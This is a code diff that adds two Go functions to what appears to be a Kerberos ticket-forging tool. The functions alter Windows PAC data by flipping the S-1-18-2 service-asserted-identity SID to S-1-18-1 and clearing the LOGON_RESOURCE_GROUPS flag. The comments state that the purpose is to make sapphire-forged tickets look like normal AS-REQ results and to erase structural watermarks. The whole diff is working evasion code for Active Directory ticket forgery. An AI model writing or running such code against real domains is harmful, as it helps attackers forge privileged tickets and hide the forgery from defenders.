@@ -832,3 +832,89 @@ func ExtractUserSIDFromPAC(pacData []byte) (*SID, error) {
 	fmt.Printf("[DEBUG] Constructed user SID: %s (domain + RID %d)\n", userSID.String(), userRID)
 	return userSID, nil
 }
+
+// RewriteServiceAssertedIdentity rewrites any S-1-18-2 SIDs in the PAC to S-1-18-1.
+//
+// S-1-18-2 (SERVICE_ASSERTED_IDENTITY) is added by the KDC to the PAC's ExtraSids
+// when a ticket is obtained via S4U2Self. A TGT carrying S-1-18-2 is structurally
+// impossible for a KDC-issued TGT — it only appears in S4U service tickets.
+// Rewriting to S-1-18-1 (AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY) makes the PAC
+// look like it came from a normal AS-REQ.
+//
+// The rewrite is a single-byte flip (sub-authority 0x02 → 0x01); no resize or
+// NDR re-alignment is needed. Signatures become stale and must be recomputed —
+// downstream ResignPAC / ResignPACWithKeys handles this.
+//
+// Returns the modified PAC bytes and the number of rewrites performed.
+func RewriteServiceAssertedIdentity(pacData []byte) ([]byte, int) {
+	// S-1-18-2 binary layout (12 bytes):
+	//   01                      revision = 1
+	//   01                      numSubAuthorities = 1
+	//   00 00 00 00 00 12       authority = 18 (big-endian, 6 bytes)
+	//   02 00 00 00             sub-authority = 2 (little-endian uint32)
+	target := []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x02, 0x00, 0x00, 0x00}
+	out := make([]byte, len(pacData))
+	copy(out, pacData)
+	count := 0
+	for i := 0; i+len(target) <= len(out); i++ {
+		if bytes.Equal(out[i:i+len(target)], target) {
+			out[i+8] = 0x01
+			count++
+		}
+	}
+	return out, count
+}
+
+// UserFlags bits in KERB_VALIDATION_INFO (MS-PAC 2.5)
+const (
+	LogonExtraSIDs       uint32 = 0x00000020 // ExtraSids array non-empty
+	LogonResourceGroups  uint32 = 0x00000200 // S4U2Self watermark — resource groups inherited
+)
+
+// StripLogonResourceGroupsFlag clears the LOGON_RESOURCE_GROUPS (0x200) bit from
+// KERB_VALIDATION_INFO.UserFlags in the PAC's LOGON_INFO buffer.
+//
+// The KDC sets this bit on S4U2Self tickets. A legitimate AS-REQ TGT never has
+// this bit set, so it's a structural watermark that persists through sapphire
+// forgery. Clearing it makes the PAC's UserFlags look like a normal AS-REP result.
+//
+// Implementation: scans within the LOGON_INFO buffer only (not the whole PAC) for
+// the little-endian uint32 value 0x00000220 (LOGON_EXTRA_SIDS | LOGON_RESOURCE_GROUPS,
+// the typical S4U2Self value). Flips the 0x200 bit to zero, leaving 0x00000020.
+//
+// Signatures are recomputed downstream by ResignPAC / ResignPACWithKeys.
+//
+// Returns the modified PAC bytes and the number of rewrites performed.
+func StripLogonResourceGroupsFlag(pacData []byte) ([]byte, int) {
+	parsed, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return pacData, 0
+	}
+
+	out := make([]byte, len(pacData))
+	copy(out, pacData)
+	count := 0
+
+	// UserFlags 0x220 in little-endian is 20 02 00 00.
+	// We scan only within LOGON_INFO to minimize false-positive surface.
+	target := []byte{0x20, 0x02, 0x00, 0x00}
+
+	for _, buf := range parsed.Buffers {
+		if buf.Type != LogonInfoType {
+			continue
+		}
+		bufStart := int(buf.Offset)
+		bufEnd := bufStart + int(buf.Size)
+		if bufStart < 0 || bufEnd > len(out) {
+			continue
+		}
+		for i := bufStart; i+len(target) <= bufEnd; i++ {
+			if bytes.Equal(out[i:i+len(target)], target) {
+				out[i+1] = 0x00 // clear the 0x200 bit (byte offset 1 of the LE uint32)
+				count++
+			}
+		}
+	}
+
+	return out, count
+}
